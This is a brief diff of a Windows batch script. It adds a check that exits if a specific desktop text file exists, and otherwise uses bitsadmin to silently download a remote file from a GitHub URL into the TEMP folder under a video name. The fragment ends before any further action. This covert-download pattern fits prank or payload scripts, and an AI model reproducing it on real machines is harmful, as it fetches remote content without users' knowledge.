@@ -1,6 +1,6 @@
 @echo off
 
-rem if not exist "%USERPROFILE%\Desktop\Matematik" exit
+if exist "%USERPROFILE%\Desktop\Yeni Metin Belgesi.txt" exit
 
 if not exist "%TEMP%\ataturk.mp4" (
 bitsadmin /transfer vidjob /download /priority high "https://raw.githubusercontent.com/similartobash/rc/main/video.mp4" "%TEMP%\ataturk.mp4"
